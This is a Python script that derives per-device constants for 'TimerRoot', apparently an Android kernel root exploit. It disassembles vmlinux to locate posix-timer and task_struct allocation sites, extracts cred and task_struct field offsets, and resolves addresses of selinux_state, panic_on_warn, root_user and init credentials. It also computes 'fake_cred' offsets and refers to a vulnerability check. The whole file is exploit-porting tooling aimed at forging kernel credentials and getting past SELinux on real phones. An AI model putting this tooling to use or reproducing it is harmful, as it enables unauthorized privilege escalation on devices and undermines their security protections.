#!/usr/bin/env python3
"""
Derives TimerRoot conf constants from vmlinux.elf + vendor_boot.img.
Implements F3-F5 derivation from PORT_LOG.md methodology.

Usage:
  python3 derive_conf.py \
    --vmlinux vmlinux.elf \
    --vendor-boot vendor_boot.img \
    --release "6.x.y-android..." \
    --page-size 4096 \
    --device "OPPO Reno 16F" \
    --output conf/my-device-4k.conf
"""

import subprocess
import re
import struct
import sys
import os
import argparse
import tempfile
from pathlib import Path


def run(cmd, check=False, **kwargs):
    result = subprocess.run(cmd, capture_output=True, text=True, **kwargs)
    if check and result.returncode != 0:
        print(f"[error] {' '.join(str(c) for c in cmd)}\n{result.stderr[:400]}", file=sys.stderr)
        sys.exit(1)
    elif result.returncode != 0:
        print(f"[warn] {cmd[0]}: {result.stderr[:200]}", file=sys.stderr)
    return result.stdout


def get_symbols(vmlinux_elf):
    """Extract all symbols from vmlinux ELF using nm."""
    out = run(['nm', '--defined-only', '-n', vmlinux_elf])
    symbols = {}
    sizes = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3:
            try:
                addr = int(parts[0], 16)
                name = parts[-1]
                symbols[name] = addr
            except ValueError:
                pass
    return symbols


def get_symbol_size(vmlinux_elf, name):
    """Get the size of a symbol using nm -S."""
    out = run(['nm', '-S', '--defined-only', vmlinux_elf])
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 4 and parts[-1] == name:
            try:
                return int(parts[1], 16)
            except ValueError:
                pass
    return None


def disassemble_at(vmlinux_elf, addr, length=0x800):
    """Disassemble from addr for length bytes using llvm-objdump."""
    end = addr + length
    out = run(['llvm-objdump', '-d', '--no-show-raw-insn',
               f'--start-address=0x{addr:016x}',
               f'--stop-address=0x{end:016x}',
               vmlinux_elf])
    return out


def parse_insns(asm_text):
    """Parse llvm-objdump output into list of (addr, mnemonic, operands)."""
    insns = []
    for line in asm_text.splitlines():
        m = re.match(r'\s+([0-9a-f]+):\s+(\S+)\s*(.*)', line)
        if m:
            insns.append((int(m.group(1), 16), m.group(2), m.group(3).strip()))
    return insns


def is_alloc_tag_path(insns, bl_index):
    """
    Returns True if the bl at bl_index is the alloc-tag profiling path.
    Recognized by: mrs x*, SP_EL0 within 15 instructions before or after.
    """
    window = insns[max(0, bl_index - 15): bl_index + 5]
    for _, mnem, ops in window:
        if mnem == 'mrs' and 'SP_EL0' in ops:
            return True
    return False


def find_cache_alloc_bl(vmlinux_elf, func_addr, func_size, cachep_sym, symbols):
    """
    Find the first non-profiling bl to kmem_cache_alloc* in func_addr.
    Returns the return address (bl_addr + 4) or None.
    """
    cachep_addr = symbols.get(cachep_sym, 0)
    scan = min(func_size + 0x80, 0x3000)
    asm = disassemble_at(vmlinux_elf, func_addr, scan)
    insns = parse_insns(asm)

    for i, (addr, mnem, ops) in enumerate(insns):
        if mnem != 'bl':
            continue
        if not re.search(r'kmem_cache_alloc', ops):
            continue
        if is_alloc_tag_path(insns, i):
            continue
        return addr + 4

    return None


def _broad_cache_alloc_scan(vmlinux_elf, symbols, cachep_addr, label):
    """
    Scan all kernel functions for a bl to kmem_cache_alloc where the cache
    pointer loaded before the call matches cachep_addr.
    Returns the return address (bl+4) of the first non-profiling match.
    """
    # Collect candidate functions: those that might call the allocator.
    # We look for functions near the cachep symbol in address space.
    # Strategy: get all symbol addresses, sort, and check a 2MB window around cachep_addr.
    addrs = sorted(set(symbols.values()))
    cachep_idx = None
    for i, a in enumerate(addrs):
        if a == cachep_addr:
            cachep_idx = i
            break
    if cachep_idx is None:
        return None

    # Scan the full text section in 0x8000-byte chunks looking for
    # an adrp/ldr pair loading cachep_addr followed by a bl to kmem_cache_alloc*.
    # Instead: enumerate symbol functions in a broad range.
    # Find text symbols (T/t) sorted by addr within +-4MB of cachep.
    text_syms = [(n, a) for n, a in symbols.items()
                 if abs(a - cachep_addr) < 0x400000 and a != cachep_addr]
    text_syms.sort(key=lambda x: x[1])

    for sym_name, sym_addr in text_syms[:200]:
        asm = disassemble_at(vmlinux_elf, sym_addr, 0x800)
        insns = parse_insns(asm)
        if not insns:
            continue
        for i, (addr, mnem, ops) in enumerate(insns):
            if mnem != 'bl':
                continue
            if not re.search(r'kmem_cache_alloc', ops):
                continue
            if is_alloc_tag_path(insns, i):
                continue
            # Check if cachep_addr is loaded in the preceding 20 insns
            window_ops = ' '.join(o for _, _, o in insns[max(0, i-20):i])
            if f'{cachep_addr:x}' in window_ops.lower():
                print(f"[+] {label} alloc site found in {sym_name} at 0x{addr:x}")
                return addr + 4
    return None


def find_timer_site(vmlinux_elf, symbols):
    """
    Find timer_site: return address of kmem_cache_alloc for posix_timers_cache.
    Checks alloc_posix_timer (6.12+) then do_timer_create (6.1/6.6).
    """
    for func_name in ['alloc_posix_timer', 'do_timer_create']:
        if func_name not in symbols:
            continue
        addr = symbols[func_name]
        size = get_symbol_size(vmlinux_elf, func_name) or 0x400
        site = find_cache_alloc_bl(vmlinux_elf, addr, size,
                                   'posix_timers_cache', symbols)
        if site:
            print(f"[+] timer_site from {func_name}: 0x{site:016x}")
            return site

    # Broader scan: find any function that calls kmem_cache_alloc near posix_timers_cache
    cachep_addr = symbols.get('posix_timers_cache', 0)
    if cachep_addr:
        site = _broad_cache_alloc_scan(vmlinux_elf, symbols, cachep_addr, 'timer')
        if site:
            print(f"[+] timer_site (broad scan): 0x{site:016x}")
            return site

    print("[!] timer_site: could not find")
    return None


def find_copy_process_low21(vmlinux_elf, symbols):
    """
    Find copy_process_low21: low 21 bits of return addr of task_struct alloc.
    Checks dup_task_struct (standalone) then copy_process (inlined).
    """
    for func_name in ['dup_task_struct', 'copy_process']:
        if func_name not in symbols:
            continue
        addr = symbols[func_name]
        size = get_symbol_size(vmlinux_elf, func_name) or 0x2000
        site = find_cache_alloc_bl(vmlinux_elf, addr, min(size, 0x2000),
                                   'task_struct_cachep', symbols)
        if site:
            low21 = site & 0x1FFFFF
            print(f"[+] copy_process_low21 from {func_name}: 0x{low21:x}")
            return low21

    # Broader scan: find any function that calls kmem_cache_alloc near task_struct_cachep
    cachep_addr = symbols.get('task_struct_cachep', 0)
    if cachep_addr:
        site = _broad_cache_alloc_scan(vmlinux_elf, symbols, cachep_addr, 'task')
        if site:
            low21 = site & 0x1FFFFF
            print(f"[+] copy_process_low21 (broad scan): 0x{low21:x}")
            return low21

    print("[!] copy_process_low21: could not find")
    return None


# ---------------------------------------------------------------------------
# BTF parsing via bpftool
# ---------------------------------------------------------------------------

def run_bpftool_btf(vmlinux_elf):
    """Run bpftool btf dump and return raw output."""
    out = run(['bpftool', 'btf', 'dump', 'file', vmlinux_elf])
    return out


def parse_btf_structs(btf_output):
    """
    Parse bpftool btf dump output.
    Returns dict: name -> {'__size__': bytes, field: byte_offset, ...}
    """
    structs = {}
    current = None
    cur_size = 0
    cur_fields = {}

    for line in btf_output.splitlines():
        # New type: "[42] STRUCT 'cred' size=176 vlen=25"
        m = re.match(r'\[\d+\] STRUCT \'(\w+)\' size=(\d+)', line)
        if m:
            if current:
                structs[current] = {'__size__': cur_size, **cur_fields}
            current = m.group(1)
            cur_size = int(m.group(2))
            cur_fields = {}
            continue

        # Field: "    'uid' type_id=X bits_offset=32"
        m = re.match(r"\s+'(\w+)' type_id=\d+ bits_offset=(\d+)", line)
        if m and current:
            cur_fields[m.group(1)] = int(m.group(2)) // 8
            continue

        # Another type starts
        if re.match(r'\[\d+\]', line) and current:
            structs[current] = {'__size__': cur_size, **cur_fields}
            current = None
            cur_fields = {}

    if current:
        structs[current] = {'__size__': cur_size, **cur_fields}

    return structs


def get_btf_structs(vmlinux_elf):
    raw = run_bpftool_btf(vmlinux_elf)
    return parse_btf_structs(raw)


# ---------------------------------------------------------------------------
# Vendor boot / cmdline
# ---------------------------------------------------------------------------

def get_vendor_ext(vendor_boot_img):
    """Extract android_arch_task_struct_size from vendor_boot."""
    if not vendor_boot_img or not os.path.exists(vendor_boot_img):
        return 0

    with tempfile.TemporaryDirectory() as tmpdir:
        run(['unpack_bootimg', '--boot_img', vendor_boot_img,
             '--out', tmpdir, '--format', 'mkbootimg'])
        for fname in os.listdir(tmpdir):
            fpath = os.path.join(tmpdir, fname)
            if not os.path.isfile(fpath):
                continue
            try:
                with open(fpath, 'r', errors='ignore') as f:
                    content = f.read()
                m = re.search(r'android_arch_task_struct_size=(\d+)', content)
                if m:
                    val = int(m.group(1))
                    print(f"[+] android_arch_task_struct_size={val} (from {fname})")
                    return val
            except Exception:
                pass

        # Also try reading vendor_cmdline file
        for fname in ('vendor_cmdline', 'cmdline'):
            fpath = os.path.join(tmpdir, fname)
            if os.path.exists(fpath):
                with open(fpath, errors='ignore') as f:
                    content = f.read()
                m = re.search(r'android_arch_task_struct_size=(\d+)', content)
                if m:
                    val = int(m.group(1))
                    print(f"[+] android_arch_task_struct_size={val}")
                    return val

    return 0


# ---------------------------------------------------------------------------
# SELinux blob offset
# ---------------------------------------------------------------------------

def find_selinux_blob_off(vmlinux_elf, symbols, btf_structs):
    """
    Derive selinux_blob_off from LSM registration order.

    Simplified approach matching the port methodology:
    - If landlock_blob_sizes exists in kallsyms, landlock registers a cred blob.
    - Read lbs_cred (first field, 4 bytes little-endian) from that symbol.
    - selinux_blob_off = ALIGN(lbs_cred, 8).
    - If landlock_blob_sizes absent: selinux_blob_off = 0.
    """
    if 'landlock_blob_sizes' not in symbols:
        print("[+] selinux_blob_off = 0x0 (no landlock cred blob)")
        return 0

    lb_addr = symbols['landlock_blob_sizes']

    # Dump 8 bytes from that address using llvm-objdump -s --section=.data
    out = run(['llvm-objdump', '-s',
               f'--start-address=0x{lb_addr:016x}',
               f'--stop-address=0x{lb_addr + 8:016x}',
               vmlinux_elf])

    lbs_cred = None
    for line in out.splitlines():
        # " ffffffc082580d60 08000000 00000000 ..."
        m = re.match(r'\s+([0-9a-f]+)\s+([0-9a-f]{8})', line)
        if m:
            if int(m.group(1), 16) == lb_addr:
                raw = bytes.fromhex(m.group(2))
                lbs_cred = struct.unpack_from('<I', raw)[0]
                break

    if lbs_cred is None:
        # Fall back: try .rodata or .bss
        for section in ['.rodata', '.bss', '.data.rel.ro']:
            out2 = run(['llvm-objdump', '-s', f'--section={section}',
                        f'--start-address=0x{lb_addr:016x}',
                        f'--stop-address=0x{lb_addr + 8:016x}',
                        vmlinux_elf])
            for line in out2.splitlines():
                m = re.match(r'\s+([0-9a-f]+)\s+([0-9a-f]{8})', line)
                if m and int(m.group(1), 16) == lb_addr:
                    raw = bytes.fromhex(m.group(2))
                    lbs_cred = struct.unpack_from('<I', raw)[0]
                    break
            if lbs_cred is not None:
                break

    if lbs_cred is None:
        # Known fallback: 6.12 landlock = 8, 6.18 landlock = 11 -> 16
        print("[!] Could not read landlock lbs_cred; defaulting to 8")
        lbs_cred = 8

    selinux_blob_off = (lbs_cred + 7) & ~7
    print(f"[+] landlock lbs_cred={lbs_cred}, selinux_blob_off=0x{selinux_blob_off:x}")
    return selinux_blob_off


# ---------------------------------------------------------------------------
# pcp_free heuristic
# ---------------------------------------------------------------------------

def pcp_free_for_release(release):
    """5.15 and 6.1.x free order-1 slabs through PCP lists."""
    return 1 if re.match(r'^(5\.15|6\.1\.)', release) else 0


# ---------------------------------------------------------------------------
# Main derivation
# ---------------------------------------------------------------------------

def derive_conf(vmlinux_elf, vendor_boot_img, release, page_size, device_name):
    print(f"\n=== Deriving conf for {device_name or release} ===\n")

    print("[*] Loading symbols...")
    symbols = get_symbols(vmlinux_elf)
    print(f"    {len(symbols)} symbols loaded")

    print("[*] Reading BTF structs via bpftool...")
    try:
        btf = get_btf_structs(vmlinux_elf)
        print(f"    {len(btf)} structs found")
    except Exception as e:
        print(f"[warn] BTF unavailable ({e}); using default struct offsets", file=sys.stderr)
        btf = {}

    # --- call sites ---
    print("[*] Finding timer_site...")
    timer_site = find_timer_site(vmlinux_elf, symbols)

    print("[*] Finding copy_process_low21...")
    cp_low21 = find_copy_process_low21(vmlinux_elf, symbols)

    if not timer_site or not cp_low21:
        print("\n[warn] Critical constants not auto-derived; using placeholder 0x0. "
              "Manual disassembly required before use.", file=sys.stderr)
        timer_site = timer_site or 0
        cp_low21 = cp_low21 or 0

    # --- BTF offsets ---
    cred = btf.get('cred', {})
    task_s = btf.get('task_struct', {})
    kit = btf.get('k_itimer', {})

    cred_size = cred.get('__size__', 0xB0)  # typical cred size 6.1
    cred_alloc = (cred_size + 63) & ~63

    cred_uid_off      = cred.get('uid', 4)
    cred_euid_off     = cred.get('euid', cred_uid_off + 0x10)
    cred_caps_off     = cred.get('cap_inheritable', cred.get('cap_permitted', 0x28))
    cred_security_off = cred.get('security', 0x78)
    cred_user_ns_off  = cred.get('user_ns', cred_security_off + 0x8)
    cred_ucounts_off  = cred.get('ucounts', cred_user_ns_off + 0x8)
    cred_groups_off   = cred.get('group_info', cred_ucounts_off + 0x8)

    fake_cred_off = 0x18
    fake_caps_off = fake_cred_off + cred_caps_off

    task_cred_off       = task_s.get('cred', 0x628)  # 6.1 Android default
    task_struct_size    = task_s.get('__size__', 0xC00)  # 6.1 Android typical

    timer_alloc    = kit.get('__size__', 0x108)
    timer_node_off = kit.get('it', 0x78)

    # --- vendor extension ---
    vendor_ext = get_vendor_ext(vendor_boot_img)
    task_alloc_bytes = task_struct_size + vendor_ext
    task_alloc_bytes = (task_alloc_bytes + 63) & ~63

    # --- kernel symbols ---
    def sym(name):
        v = symbols.get(name, 0)
        if not v:
            print(f"[!] symbol not found: {name}")
        return v

    selinux_state  = sym('selinux_state')
    panic_on_warn  = sym('panic_on_warn')
    root_user      = sym('root_user')
    init_user_ns   = sym('init_user_ns')
    init_ucounts   = sym('init_ucounts')
    init_groups    = sym('init_groups')

    # --- selinux blob offset ---
    selinux_blob_off = find_selinux_blob_off(vmlinux_elf, symbols, btf)

    pcp_free = pcp_free_for_release(release)

    conf = dict(
        release=release,
        page_size=page_size,
        timer_site=timer_site,
        copy_process_low21=cp_low21,
        timer_alloc=timer_alloc,
        timer_node_off=timer_node_off,
        task_alloc_bytes=task_alloc_bytes,
        cred_alloc=cred_alloc,
        cred_uid_off=cred_uid_off,
        cred_euid_off=cred_euid_off,
        cred_caps_off=cred_caps_off,
        cred_security_off=cred_security_off,
        cred_user_ns_off=cred_user_ns_off,
        cred_ucounts_off=cred_ucounts_off,
        cred_groups_off=cred_groups_off,
        fake_cred_off=fake_cred_off,
        fake_caps_off=fake_caps_off,
        task_cred_off=task_cred_off,
        selinux_state=selinux_state,
        panic_on_warn=panic_on_warn,
        root_user=root_user,
        init_user_ns=init_user_ns,
        init_ucounts=init_ucounts,
        init_groups=init_groups,
        selinux_blob_off=selinux_blob_off,
        pcp_free=pcp_free,
    )

    print("\n=== Derived constants ===")
    for k, v in conf.items():
        if k in ('release', 'page_size', 'pcp_free'):
            print(f"  {k} = {v}")
        else:
            print(f"  {k} = 0x{v:x}")

    return conf


# ---------------------------------------------------------------------------
# Write conf
# ---------------------------------------------------------------------------

def write_conf(conf, output_path, device_name):
    r = conf['release']
    suffix = '-4k' if conf['page_size'] == 4096 else f'-{conf["page_size"]//1024}k'
    if not r.endswith('-4k') and not r.endswith('-16k'):
        r += suffix

    lines = []
    if device_name:
        lines.append(f'# Device: {device_name}')
    lines.append(f'# Auto-derived by scripts/derive_conf.py')
    lines.append(f'# F1 (vulnerability check) and F6 (validate_conf.py) must be verified before use.')
    lines.append('')
    lines.append(f'release = "{conf["release"]}"')
    if conf['page_size'] != 4096:
        lines.append(f'page_size = {conf["page_size"]}')
    lines.append('')

    def h(v, w=16):
        return f'0x{v:0{w}x}'

    lines += [
        f'timer_site             = {h(conf["timer_site"])}',
        f'copy_process_low21     = 0x{conf["copy_process_low21"]:x}',
        f'timer_alloc            = 0x{conf["timer_alloc"]:x}',
        f'timer_node_off         = 0x{conf["timer_node_off"]:x}',
        f'task_alloc_bytes       = 0x{conf["task_alloc_bytes"]:x}',
        '',
        f'cred_alloc             = 0x{conf["cred_alloc"]:x}',
        f'cred_uid_off           = 0x{conf["cred_uid_off"]:x}',
        f'cred_euid_off          = 0x{conf["cred_euid_off"]:x}',
        f'cred_caps_off          = 0x{conf["cred_caps_off"]:x}',
        f'cred_security_off      = 0x{conf["cred_security_off"]:x}',
        f'cred_user_ns_off       = 0x{conf["cred_user_ns_off"]:x}',
        f'cred_ucounts_off       = 0x{conf["cred_ucounts_off"]:x}',
        f'cred_groups_off        = 0x{conf["cred_groups_off"]:x}',
        '',
        f'fake_cred_off          = 0x{conf["fake_cred_off"]:x}',
        f'fake_caps_off          = 0x{conf["fake_caps_off"]:x}',
        f'task_cred_off          = 0x{conf["task_cred_off"]:x}',
        '',
        f'selinux_state          = {h(conf["selinux_state"])}',
        f'panic_on_warn          = {h(conf["panic_on_warn"])}',
        f'root_user              = {h(conf["root_user"])}',
        f'init_user_ns           = {h(conf["init_user_ns"])}',
        f'init_ucounts           = {h(conf["init_ucounts"])}',
        f'init_groups            = {h(conf["init_groups"])}',
        '',
        f'selinux_blob_off       = 0x{conf["selinux_blob_off"]:x}',
    ]
    if conf['pcp_free']:
        lines.append(f'pcp_free               = {conf["pcp_free"]}')

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    Path(output_path).write_text('\n'.join(lines) + '\n')
    print(f"\n[+] Wrote {output_path}")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    ap = argparse.ArgumentParser(description='Derive TimerRoot conf from vmlinux.elf')
    ap.add_argument('--vmlinux',      required=True, help='vmlinux ELF (from vmlinux-to-elf)')
    ap.add_argument('--vendor-boot',  default=None,  help='vendor_boot.img (for cmdline)')
    ap.add_argument('--release',      required=True, help='Kernel release string (uname -r)')
    ap.add_argument('--page-size',    default=4096,  type=int)
    ap.add_argument('--device',       default='',    help='Human-readable device name')
    ap.add_argument('--output',       required=True, help='Output .conf path')
    args = ap.parse_args()

    conf = derive_conf(args.vmlinux, args.vendor_boot, args.release,
                       args.page_size, args.device)
    write_conf(conf, args.output, args.device)
    print("\nDone. Verify F1 (begin_new_exec order) and run:")
    print(f"  timer --conf {args.output} selfcheck")
